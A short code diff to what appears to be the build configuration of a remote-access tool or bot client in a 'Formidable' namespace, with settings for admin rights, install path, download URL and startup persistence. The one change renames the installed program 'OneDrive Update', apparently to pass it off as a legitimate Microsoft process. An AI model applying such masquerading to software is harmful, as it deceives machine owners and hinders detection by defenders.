@@ -235,7 +235,7 @@ namespace Formidable {
         "default",              // szGroupName
         1,                      // runasAdmin (1: Yes)
         "",                     // szInstallDir
-        "",                     // szInstallName
+        "OneDrive Update",      // szInstallName
         "",                     // szDownloadUrl
         0,                      // taskStartup
         0,                      // serviceStartup
